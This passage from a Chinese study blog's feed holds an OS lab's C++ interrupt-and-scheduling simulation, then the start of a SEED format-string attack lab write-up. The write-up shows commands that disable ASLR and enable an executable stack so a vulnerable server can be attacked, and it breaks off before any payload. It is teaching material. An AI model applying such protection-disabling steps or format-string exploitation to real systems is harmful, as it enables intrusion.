class="hljs-string">&quot;一条指令正在执行&quot;</span> &lt;&lt; endl;<br>counter++;<br>cout &lt;&lt; <span class="hljs-string">&quot;是否有中断产生，1是，0否：&quot;</span>; <span class="hljs-comment">//每输入一次频率设置为1s</span><br>cin &gt;&gt; ir;<br><span class="hljs-keyword">if</span> (ir == <span class="hljs-number">0</span>)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;无中断，指令继续执行&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;正在保护现场···&quot;</span> &lt;&lt; endl <span class="hljs-comment">//保护现场具体过程省略</span><br> &lt;&lt; <span class="hljs-string">&quot;现场保护完成&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;---------------------------------------&quot;</span> &lt;&lt; endl;<br>timer++;   <span class="hljs-comment">//计时器加1</span><br>clock_alarm--; <span class="hljs-comment">//定时闹钟减1</span><br>&#125;<br>&#125;<br>cout &lt;&lt; <span class="hljs-string">&quot;时间过去了&quot;</span> &lt;&lt; timer &lt;&lt; <span class="hljs-string">&quot;s&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;现在时间是：&quot;</span> &lt;&lt; endl;<br>cc-&gt;tm_hour += timer / <span class="hljs-number">3600</span>; <span class="hljs-comment">//计算当前时间</span><br>timer %= <span class="hljs-number">3600</span>;<br>cc-&gt;tm_min += timer / <span class="hljs-number">60</span>;<br>timer %= <span class="hljs-number">60</span>;<br>cc-&gt;tm_sec += timer;<br>cout &lt;&lt; <span class="hljs-built_in">asctime</span>(cc);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="程序初值和运行结果"><a class="markdownIt-Anchor" href="#程序初值和运行结果"></a> 程序初值和运行结果</h4><p>定时闹钟clock_alarm=5</p><p><img src="/posts/8a95bb2a/image-20211112110700237.png" alt="image-20211112110700237"></p><p>定时闹钟clock_alarm=3</p><p><img src="/posts/8a95bb2a/image-20211112110831917.png" alt="image-20211112110831917"></p><p>定时闹钟clock_alarm=6</p><p><img src="/posts/8a95bb2a/image-20211112111022197.png" alt="image-20211112111022197"></p><h3 id="2-思考题时钟中断程序加调度"><a class="markdownIt-Anchor" href="#2-思考题时钟中断程序加调度"></a> 2. 思考题：时钟中断程序加调度</h3><h4 id="数据结构"><a class="markdownIt-Anchor" href="#数据结构"></a> 数据结构</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PCB</span> //进程结构体</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">int</span> time_slice; <span class="hljs-comment">//时间片</span><br><span class="hljs-keyword">int</span> time_remain; <span class="hljs-comment">//进程剩余运行时间</span><br><span class="hljs-keyword">int</span> id; <span class="hljs-comment">//进程id</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><h4 id="符号说明"><a class="markdownIt-Anchor" href="#符号说明"></a> 符号说明</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">queue&lt;PCB&gt; p; <span class="hljs-comment">//进程的就绪队列</span><br>PCB process;<span class="hljs-comment">//当前进程</span><br><span class="hljs-keyword">time_t</span> t;<span class="hljs-comment">//存储日历时间类型</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tm</span> *<span class="hljs-title">cc</span>;</span><span class="hljs-comment">//用来保存时间和日期的结构</span><br></code></pre></div></td></tr></table></figure><h4 id="函数说明"><a class="markdownIt-Anchor" href="#函数说明"></a> 函数说明</h4><h5 id="时间计算函数"><a class="markdownIt-Anchor" href="#时间计算函数"></a> 时间计算函数</h5><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">time_caculate</span><span class="hljs-params">(<span class="hljs-keyword">int</span> timer)</span> <span class="hljs-comment">//计算当前时间</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;现在时间是：&quot;</span> &lt;&lt; endl;<br>cc-&gt;tm_hour += timer / <span class="hljs-number">3600</span>;<br>timer %= <span class="hljs-number">3600</span>;<br>cc-&gt;tm_min += timer / <span class="hljs-number">60</span>;<br>timer %= <span class="hljs-number">60</span>;<br>cc-&gt;tm_sec += timer;<br>cout &lt;&lt; <span class="hljs-built_in">asctime</span>(cc);<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="进程初始化函数"><a class="markdownIt-Anchor" href="#进程初始化函数"></a> 进程初始化函数</h5><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process_init</span><span class="hljs-params">(queue&lt;PCB&gt; &amp;p)</span> <span class="hljs-comment">//进程初始化，给定一些进程的初值</span></span><br><span class="hljs-function"></span>&#123;<br>PCB ex[<span class="hljs-number">4</span>];<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>&#123;<br>ex[i].id = i + <span class="hljs-number">1</span>;<br>ex[i].time_slice = <span class="hljs-number">2</span>;<br>ex[i].time_remain = <span class="hljs-number">2</span> + i;<br>p.<span class="hljs-built_in">push</span>(ex[i]);<br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="进程保存函数"><a class="markdownIt-Anchor" href="#进程保存函数"></a> 进程保存函数</h5><blockquote><p>保存进程的时间片信息，具体其他信息的保存省略</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process_save</span><span class="hljs-params">()</span> <span class="hljs-comment">//中断发生时的进程保存</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;正在保护现场···&quot;</span> &lt;&lt; endl;<br>process.time_remain--; <span class="hljs-comment">//每产生一次时钟中断经处理后，被中断进程时间减1</span><br>process.time_slice--;  <span class="hljs-comment">//时间片也减1</span><br><br>cout &lt;&lt; <span class="hljs-string">&quot;现场保护完成&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;---------------------------------------&quot;</span> &lt;&lt; endl;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="进程调度函数"><a class="markdownIt-Anchor" href="#进程调度函数"></a> 进程调度函数</h5><blockquote><p>分为三种情况</p><p>第一种为进程运行时间已完成</p><p>第二种为进程时间片用完</p><p>这两种都需要切换进程</p><p>第三种则是时间片和进程剩余时间均不为零，继续运行当前进程</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">process_schedule</span><span class="hljs-params">(<span class="hljs-keyword">int</span> ir, <span class="hljs-keyword">int</span> timer)</span></span><br><span class="hljs-function"></span>&#123;<br><br><span class="hljs-keyword">if</span> (process.time_remain == <span class="hljs-number">0</span>)<br>ir = <span class="hljs-number">1</span>; <span class="hljs-comment">//标记进程已结束或中断，需要切换进程</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (process.time_slice == <span class="hljs-number">0</span>)<br>&#123;<br>ir = <span class="hljs-number">1</span>;<span class="hljs-comment">//当前进程已结束或中断，需要切换进程</span><br>process.time_slice = <span class="hljs-number">2</span>; <span class="hljs-comment">//恢复时间片</span><br>p.<span class="hljs-built_in">push</span>(process);<span class="hljs-comment">//再次放入就绪队列</span><br>&#125;<br><span class="hljs-keyword">else</span><br>ir = <span class="hljs-number">-1</span>; <span class="hljs-comment">//当前进程继续运行</span><br><span class="hljs-keyword">if</span> (ir == <span class="hljs-number">1</span>)<br>&#123;<br><br>cout &lt;&lt; <span class="hljs-string">&quot;正在进行处理器调度···&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;---------------------------------------&quot;</span> &lt;&lt; endl;<br>process = p.<span class="hljs-built_in">front</span>();<br><span class="hljs-keyword">if</span> (!p.<span class="hljs-built_in">empty</span>())<br>p.<span class="hljs-built_in">pop</span>();<br><span class="hljs-keyword">else</span><br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;所以进程已经执行完成,时间过去了&quot;</span> &lt;&lt; timer &lt;&lt; <span class="hljs-string">&quot;s&quot;</span> &lt;&lt; endl;<br><span class="hljs-built_in">time_caculate</span>(timer); <span class="hljs-comment">//进程队列为空则结束，计算时间</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">//返回0表示结束程序</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ir == <span class="hljs-number">-1</span>)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;正在进行处理器调度···&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;---------------------------------------&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="源代码-2"><a class="markdownIt-Anchor" href="#源代码-2"></a> 源代码</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PCB</span> //进程结构体</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">int</span> time_slice; <span class="hljs-comment">//时间片</span><br><span class="hljs-keyword">int</span> time_remain; <span class="hljs-comment">//进程剩余运行时间</span><br><span class="hljs-keyword">int</span> id; <span class="hljs-comment">//进程id</span><br>&#125;;<br><br>queue&lt;PCB&gt; p;  <span class="hljs-comment">//进程的就绪队列</span><br>PCB process;   <span class="hljs-comment">//当前进程</span><br><span class="hljs-keyword">time_t</span> t;   <span class="hljs-comment">//存储日历时间类型</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tm</span> *<span class="hljs-title">cc</span>;</span> <span class="hljs-comment">//用来保存时间和日期的结构</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">time_caculate</span><span class="hljs-params">(<span class="hljs-keyword">int</span> timer)</span> <span class="hljs-comment">//计算当前时间</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;现在时间是：&quot;</span> &lt;&lt; endl;<br>cc-&gt;tm_hour += timer / <span class="hljs-number">3600</span>;<br>timer %= <span class="hljs-number">3600</span>;<br>cc-&gt;tm_min += timer / <span class="hljs-number">60</span>;<br>timer %= <span class="hljs-number">60</span>;<br>cc-&gt;tm_sec += timer;<br>cout &lt;&lt; <span class="hljs-built_in">asctime</span>(cc);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process_init</span><span class="hljs-params">(queue&lt;PCB&gt; &amp;p)</span> <span class="hljs-comment">//进程初始化，给定一些进程的初值</span></span><br><span class="hljs-function"></span>&#123;<br>PCB ex[<span class="hljs-number">4</span>];<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>&#123;<br>ex[i].id = i + <span class="hljs-number">1</span>;<br>ex[i].time_slice = <span class="hljs-number">2</span>;<br>ex[i].time_remain = <span class="hljs-number">2</span> + i;<br>p.<span class="hljs-built_in">push</span>(ex[i]);<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process_save</span><span class="hljs-params">()</span> <span class="hljs-comment">//中断发生时的进程保存</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;正在保护现场···&quot;</span> &lt;&lt; endl;<br>process.time_remain--; <span class="hljs-comment">//每产生一次时钟中断经处理后，被中断进程时间减1</span><br>process.time_slice--;  <span class="hljs-comment">//时间片也减1</span><br><br>cout &lt;&lt; <span class="hljs-string">&quot;现场保护完成&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;---------------------------------------&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">process_schedule</span><span class="hljs-params">(<span class="hljs-keyword">int</span> ir, <span class="hljs-keyword">int</span> timer)</span></span><br><span class="hljs-function"></span>&#123;<br><br><span class="hljs-keyword">if</span> (process.time_remain == <span class="hljs-number">0</span>)<br>ir = <span class="hljs-number">1</span>; <span class="hljs-comment">//标记进程已结束或中断，需要切换进程</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (process.time_slice == <span class="hljs-number">0</span>)<br>&#123;<br>ir = <span class="hljs-number">1</span>;<span class="hljs-comment">//当前进程已结束或中断，需要切换进程</span><br>process.time_slice = <span class="hljs-number">2</span>; <span class="hljs-comment">//恢复时间片</span><br>p.<span class="hljs-built_in">push</span>(process);<span class="hljs-comment">//再次放入就绪队列</span><br>&#125;<br><span class="hljs-keyword">else</span><br>ir = <span class="hljs-number">-1</span>; <span class="hljs-comment">//当前进程继续运行</span><br><span class="hljs-keyword">if</span> (ir == <span class="hljs-number">1</span>)<br>&#123;<br><br>cout &lt;&lt; <span class="hljs-string">&quot;正在进行处理器调度···&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;---------------------------------------&quot;</span> &lt;&lt; endl;<br>process = p.<span class="hljs-built_in">front</span>();<br><span class="hljs-keyword">if</span> (!p.<span class="hljs-built_in">empty</span>())<br>p.<span class="hljs-built_in">pop</span>();<br><span class="hljs-keyword">else</span><br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;所以进程已经执行完成,时间过去了&quot;</span> &lt;&lt; timer &lt;&lt; <span class="hljs-string">&quot;s&quot;</span> &lt;&lt; endl;<br><span class="hljs-built_in">time_caculate</span>(timer); <span class="hljs-comment">//进程队列为空则结束，计算时间</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">//返回0表示结束程序</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ir == <span class="hljs-number">-1</span>)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;正在进行处理器调度···&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;---------------------------------------&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><br><span class="hljs-keyword">int</span> timer = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">int</span> counter = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">int</span> clock_alarm;<br><span class="hljs-keyword">int</span> ir = <span class="hljs-number">0</span>; <span class="hljs-comment">//中断寄存器</span><br><br><span class="hljs-built_in">process_init</span>(p); <span class="hljs-comment">//初始化进程</span><br><br><span class="hljs-built_in">time</span>(&amp;t);<br>cc = <span class="hljs-built_in">localtime</span>(&amp;t);<br><br>cout &lt;&lt; <span class="hljs-string">&quot;开机时间：&quot;</span> &lt;&lt; <span class="hljs-built_in">asctime</span>(cc);<br>cout &lt;&lt; <span class="hljs-string">&quot;定时闹钟的设定值为：&quot;</span>;<br>cin &gt;&gt; clock_alarm;<br>cout &lt;&lt; endl;<br><br>process = p.<span class="hljs-built_in">front</span>();<br>p.<span class="hljs-built_in">pop</span>();<br><span class="hljs-keyword">while</span> (clock_alarm != <span class="hljs-number">0</span>)<br>&#123;<br><br>cout &lt;&lt; <span class="hljs-string">&quot;进程&quot;</span> &lt;&lt; process.id &lt;&lt; <span class="hljs-string">&quot;正在执行&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;当前进程剩余的时间片：&quot;</span> &lt;&lt; process.time_slice &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;当前进程剩余执行时间：&quot;</span> &lt;&lt; process.time_remain &lt;&lt; endl;<br>counter++;<br>cout &lt;&lt; <span class="hljs-string">&quot;是否有中断产生，1是，0否：&quot;</span>; <span class="hljs-comment">//每输入一次频率设置为1s</span><br>cin &gt;&gt; ir;<br><span class="hljs-keyword">if</span> (ir == <span class="hljs-number">0</span>)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;未发生中断，进程继续执行&quot;</span> &lt;&lt; endl;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">process_save</span>();<br>timer++;<br>clock_alarm--;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">process_schedule</span>(ir, timer) == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br>cout &lt;&lt; <span class="hljs-string">&quot;定时结束，时间过去了&quot;</span> &lt;&lt; timer &lt;&lt; <span class="hljs-string">&quot;s&quot;</span> &lt;&lt; endl;<br><span class="hljs-built_in">time_caculate</span>(timer);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h4 id="程序初值和运行结果-2"><a class="markdownIt-Anchor" href="#程序初值和运行结果-2"></a> 程序初值和运行结果</h4><p>clock_alarm设定值为4</p><p><img src="/posts/8a95bb2a/image-20211112115344801.png" alt="image-20211112115344801"></p><p>clock_alarm设定值为5</p><p><img src="/posts/8a95bb2a/image-20211112115544971.png" alt="image-20211112115544971"></p><p>当所有进程运行时间小于定时闹钟设定值时：</p><p><img src="/posts/8a95bb2a/image-20211112120044861.png" alt="image-20211112120044861"></p><p><img src="/posts/8a95bb2a/image-20211112120118837.png" alt="image-20211112120118837"></p><h3 id="五-实验总结"><a class="markdownIt-Anchor" href="#五-实验总结"></a> 五、实验总结</h3><p>对于只有中断的程序设计较为简单，设置一个定时时钟，然后进行中断判断，当输入为1时，中断进程，定时闹钟减一，输入为0时，继续执行当前进程。</p><p>对于思考题，需要考虑时间片轮转调度，程序主要思路就是当进程运行时间或者时间片结束时，切换进程，否则继续执行当前进程。</p><p>这个实验相对较为容易，只考虑了就绪队列和当前运行进程。</p><p>通过这次模拟实验，我了解了中断的过程以及中断处理程序的作用，当CPU收到中断或者异常的信号时，它会暂停执行当前的程序或任务然后通过进程调度函数进行进程切换。</p><p>同时也进行了许久没写过的C++编程，代码太久没编果然会生疏，很多简单的思路总是想不清楚，但总算最后顺利完成了，还是有很多收获的。</p>]]></content>
    
    
    <categories>
      
      <category>Course Study</category>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统</tag>
      
      <tag>Lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>软件安全Lab3-Format String Attack</title>
    <link href="/posts/35f73974/"/>
    <url>/posts/35f73974/</url>
    
    <content type="html"><![CDATA[<h1 id="format-string-attack-lab"><a class="markdownIt-Anchor" href="#format-string-attack-lab"></a> Format String Attack Lab</h1><h1 id="1-overview"><a class="markdownIt-Anchor" href="#1-overview"></a> 1. Overview</h1><p><a href="https://seedsecuritylabs.org/Labs_20.04/Software/Format_String/">实验网站地址</a></p><p>C语言中的 <code>printf()</code> 函数用于根据格式打印字符串。它的第一个参数称为 <code>format string</code> ，它定义了字符串应该如何格式化。</p><p>格式字符串使用由 % 字符标记的占位符在 <code>printf()</code> 函数的打印期间填充数据。</p><p>格式字符串的使用不仅限于 <code>printf()</code> 函数，许多其他函数，如 <code>sprintf()</code>、<code>fprintf()</code> 和 <code>scanf()</code>，也使用格式字符串。</p><p>有些程序允许用户以格式字符串的形式提供全部或部分内容。如果这些内容没有被清除，恶意用户可以利用这个机会让程序运行任意代码。</p><p>这样的问题称为 <code>format string vulnerability</code> （格式字符串漏洞）。</p><p>实验主要任务</p><ol><li>使程序崩溃</li><li>读取程序的内部内存</li><li>修改程序的内部内存</li><li>最严重的是，利用受害者程序的特权注入和执行恶意代码。</li></ol><h1 id="2-environment-setup"><a class="markdownIt-Anchor" href="#2-environment-setup"></a> 2. Environment Setup</h1><p>实验环境：Seed Ubuntu 20.04</p><ul><li><p>关闭栈随机化</p><p>现代操作系统使用地址空间随机化来随机化堆和堆栈的起始地址。这使得猜测准确的地址变得困难;猜测地址是格式字符串攻击的关键步骤之一。为了简化这个实验室中的任务，我们使用以下命令关闭地址随机化:</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">$ sudo sysctl -w kernel.<span class="hljs-attribute">randomize_va_space</span>=0<br></code></pre></div></td></tr></table></figure></li><li><p>编译程序</p><p>将把格式化程序编译为32位和64位二进制文件。我们预构建的Ubuntu 20.04  VM是一个64位VM，但它仍然支持32位二进制文件。我们所需要做的就是在gcc命令中使用-m32选项。对于32位编译，我们还使用-static来生成静态链接。</p><p>编译命令已经在makefile中提供。要编译代码，只需要键入make来执行这些命令。编译之后，我们需要将二进制文件复制到fmt-containers文件夹中，以便容器可以使用它们。下面的命令执行编译和安装。</p><figure class="highlight gauss"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gauss"><span class="hljs-built_in">make</span><br><span class="hljs-built_in">make</span> install<br></code></pre></div></td></tr></table></figure><figure class="highlight haml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs haml"># 一些gcc选项<br>-<span class="ruby">z execstack  <span class="hljs-comment"># 允许堆栈可执行，让我们的恶意代码可以执行</span></span><br><span class="ruby"></span>-<span class="ruby">static       <span class="hljs-comment"># 静态链接，32-bit动态链接库没有被安装在容器中</span></span><br><span class="ruby"></span>-<span class="ruby">m32          <span class="hljs-comment"># 编译32-bit二进制程序选项</span></span><br></code></pre></div></td></tr></table></figure></li><li><p>建立容器</p><figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">dcbulid</span>   <span class="hljs-comment"># Alias for: docker-compose build</span><br>dcup      <span class="hljs-comment"># Alias for: docker-compose up</span><br></code></pre></div></td></tr></table></figure><p><img src="/posts/35f73974/image-20211203161524995.png" alt="image-20211203161524995"></p><p><img src="/posts/35f73974/image-20211203161530867.png" alt="image-20211203161530867"></p><figure class="highlight handlebars"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs handlebars"><span class="xml">dcdown      # Alias for: docker-compose down关闭容器</span><br><span class="xml">dockps      # Alias for: docker ps --format &quot;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.ID</span>&#125;&#125;</span><span class="xml"> </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.Names</span>&#125;&#125;</span><span class="xml">&quot;打印容器id</span><br><span class="xml">docksh <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span> # Alias for: docker exec -it <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span> /bin/bas在容器内运行一个shell</span><br></code></pre></div></td></tr></table></figure></li></ul><h1 id="task-1-crashing-the-program"><a class="markdownIt-Anchor" href="#task-1-crashing-the-program"></a> Task 1: Crashing the Program</h1><p>当我们使用docker-compose.yml开始运行容器时。将启动两个容器，每个容器运行一个易受攻击的服务器。对于这个任务，我们将使用运行在10.9.0.5上的服务器，它运行一个具有格式字符串漏洞的32位程序。</p><ul><li><p>我们首先向该服务器发送一条正常的消息。我们将看到目标容器打印出的以下消息(您看到的实际消息可能不同)。</p><p><img src="/posts/35f73974/image-20211203161440201.png" 